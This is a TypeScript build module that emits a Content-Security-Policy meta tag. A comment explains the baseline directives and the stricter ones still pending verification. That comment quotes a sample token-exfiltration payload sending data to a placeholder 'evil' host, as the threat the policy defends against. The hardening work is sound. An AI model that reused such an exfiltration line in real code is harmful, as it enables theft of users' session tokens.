/**
 * Content-Security-Policy meta tag for the static build (bench-review#3
 * hardening — defense-in-depth against the raw `x-html` sinks).
 *
 * Injected into every dist/*.html <head> by build.ts, mirroring the
 * ts-analytics / SEO post-build splice (buildApp()'s SSG ignores
 * config.app.head, so a response header isn't available app-side; a
 * <meta http-equiv> is the app-owned mechanism). Note: `frame-ancestors`,
 * `report-uri`, and report-only are IGNORED in a meta CSP — clickjacking
 * (`frame-ancestors`/X-Frame-Options) must be set at the deploy/CDN layer.
 *
 * ── Why this file ships only the SAFE BASELINE ──────────────────────────
 * The directives below are provably non-breaking for THIS app:
 *   - object-src 'none'  — no <object>/<embed> anywhere (blocks plugin XSS)
 *   - base-uri 'self'    — no <base> tag (blocks <base href> script-hijack)
 *   - form-action 'self' — every form POSTs same-origin (blocks XSS forms
 *                          that auto-submit credentials to an external site)
 *
 * ── The part that actually closes #3 needs a LIVE pass first ────────────
 * A locked `connect-src`/`img-src`/`script-src` is what stops a stolen
 * token from being exfiltrated (`fetch('//evil/?c='+token)` / `<img
 * src=//evil>`), neutralizing the XSS→token-theft chain even though the
 * token stays JS-readable. But those directives are ENV-DEPENDENT and a
 * missed origin SILENTLY blanks maps/avatars/images/analytics on the live
 * site, so they must be verified against a running app before enabling.
 * Enumerated origins (2026-07, from code — CONFIRM before turning on):
 *   img-src     'self' data: https://images.unsplash.com https://www.gravatar.com
 *               https://ui-avatars.com https://*.tile.openstreetmap.org
 *               https://cdn.jsdelivr.net  [+ config/filesystems.ts s3.publicUrl if S3]
 *   script-src  'self' 'unsafe-inline'  [+ ts-analytics origin — TS_ANALYTICS_ENDPOINT,
 *               'http://localhost:2027' in the current dev build]
 *   connect-src 'self'  [+ ts-analytics origin]  (API is same-origin via relative /api)
 *   style-src   'self' 'unsafe-inline'   font-src 'self' data:
 * 'unsafe-inline' on script-src is unavoidable until stx emits nonces/hashes
 * on its inline scripts; even so, the connect/img lock-down blocks exfil.
 */

/** Provably-non-breaking baseline. Extend with the exfil directives above
 *  only after verifying maps/avatars/images/analytics load on a live app. */
const SAFE_BASELINE = [
  'object-src \'none\'',
  'base-uri \'self\'',
  'form-action \'self\'',
].join('; ')

/** The `<meta http-equiv>` string spliced into each page's <head>. */
export function cspMetaTag(policy: string = SAFE_BASELINE): string {
  return `<meta http-equiv="Content-Security-Policy" content="${policy}">`
}
